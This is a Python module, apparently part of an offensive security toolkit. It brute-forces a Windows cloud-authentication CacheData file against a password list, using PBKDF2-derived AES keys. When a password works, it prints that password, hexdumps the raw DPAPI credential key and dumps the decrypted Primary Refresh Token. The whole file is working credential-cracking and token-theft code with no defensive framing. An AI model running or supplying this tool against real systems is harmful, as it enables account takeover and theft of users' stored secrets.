import json
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from .dpapi_cred_key import DPAPICredKeyBlob
import struct
import hexdump

def bruteforce(arguments):
    file_path = arguments.CacheData
    with open(file_path, 'rb') as file:
        Data = bytearray(file.read())
    p = 0x60
    enc_data_size = int.from_bytes(Data[p:p + 4], byteorder='little')
    p += 4
    if arguments.verbose:
        print(f"Encrypted data size: {enc_data_size}.")
    while True:
        enc_key_size = int.from_bytes(Data[p:p + 4], byteorder='little')
        p += 4
        if arguments.verbose:
            print("enc_key_size", enc_key_size)
            print("p", p)
        if enc_key_size == 0x30:
             if int.from_bytes(Data[p + 0x30:p + 0x34], byteorder='little') == enc_data_size:
                i = p + enc_data_size
                if arguments.verbose:
                    print(i)
                break
    enc_data = Data[p + 4 + 0x30:p + 4 + 0x30 + enc_data_size]
    for password in arguments.passwords:
        if arguments.verbose:
            print("Trying: " + password + "\n")
        password_array = password.encode('utf-16-le')
        secret = get_pbkdf2(password_array)
        if arguments.verbose:
            print(secret)
        default_iv = b'\x00' * 16
        decrypted_blob = aes_decrypt(enc_data,secret,default_iv)
        version, flags, dword3, raw_dpapi_cred_key_size = struct.unpack("<IIII", decrypted_blob[0:0x10])
        if version == 0x00:
            decrypted_prt = decrypted_blob[0x70:]
            if not decrypted_prt.startswith(b'{"Version"'):
                continue
            print(f"\n[+] Password: '{password}'")
            dpapi_cred_key_blob = decrypted_blob[0x10:0x10+raw_dpapi_cred_key_size]
            dpapi_cred_key_blob_obj = DPAPICredKeyBlob(dpapi_cred_key_blob)
            print(f'[+] Dumping raw DPAPI Cred key, with GUID {dpapi_cred_key_blob_obj.Guid} (0x40 bytes):')
            hexdump.hexdump(dpapi_cred_key_blob_obj.CredKey)
            # Remove encryption padding
            decrypted_prt_end = decrypted_prt.rfind(b'}')
            assert decrypted_prt_end != -1
            decrypted_prt = decrypted_prt[:decrypted_prt_end+1]
            print("[+] Dumping decrypted PRT file:")
            prt_dict = json.loads(decrypted_prt)
            print(json.dumps(prt_dict, indent=4))
            break


def get_pbkdf2(password, salt=b'', iterations=10000):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key


def aes_decrypt(encrypted_data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    return decrypted_data